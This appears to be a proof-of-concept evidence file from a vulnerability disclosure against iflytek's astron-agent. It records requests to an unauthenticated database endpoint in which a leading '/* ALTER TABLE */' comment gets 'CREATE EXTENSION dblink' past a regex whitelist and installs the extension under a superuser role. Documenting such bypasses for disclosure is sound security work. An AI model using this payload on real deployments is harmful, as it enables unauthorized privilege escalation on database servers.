@@ -1,0 +1,48 @@
+astron-agent-poc — evidence 01 — DDL whitelist bypass via comment smuggling
+===========================================================================
+
+Target: local docker compose deployment of iflytek/astron-agent
+        main commit b4f8ed57460cbfb32016a4afd3fd7212987d33c3 (v1.1.2 verified at source)
+Route:  core-database:7990 (compose-internal address; not published to the host)
+Auth:   none sent — the router is mounted without an auth dependency
+
+Session record (requests as sent; response payloads summarised from the session —
+see evidence/README.md):
+
+-- 1. create a test database owned by the tester -----------------------------
+
+POST /xingchen-db/v1/create_database
+{"database_name":"ddl_audit_test","uid":"<test uid>"}
+
+-> code 0, data.database_id returned.
+
+-- 2. negative control: the bare command is rejected -------------------------
+
+POST /xingchen-db/v1/exec_ddl
+{"database_id":<step-1 id>,"uid":"<same test uid>",
+ "ddl":"CREATE EXTENSION IF NOT EXISTS dblink"}
+
+-> rejected. SQLGlot 26.29.0 (uv.lock:1916) parses CREATE EXTENSION to
+   exp.Command whose .key is the literal "command"; the whitelist's Command
+   branch then searches the raw SQL for \bALTER\s+TABLE\b, finds nothing, and
+   resolves the type to "command" — not in ALLOWED_DDL_STATEMENTS.
+
+-- 3. the same command behind a comment is accepted --------------------------
+
+POST /xingchen-db/v1/exec_ddl
+{"database_id":<step-1 id>,"uid":"<same test uid>",
+ "ddl":"/* ALTER TABLE */ CREATE EXTENSION IF NOT EXISTS dblink"}
+
+-> accepted (code 0). The regex matches "ALTER TABLE" INSIDE THE COMMENT; the
+   AST root remains a Command. The rebuilt statement (SQLGlot 26.29.0 preserves
+   the leading comment on re-serialization) executed against PostgreSQL.
+
+-- 4. observed server-side effect -------------------------------------------
+
+\dx in the test database showed the dblink extension installed.
+
+The connection role is the compose-shipped spark user, which the official
+postgres image creates as a superuser.
+
+What was NOT demonstrated: file reading, cross-schema access, host-level code
+execution. Not claimed.
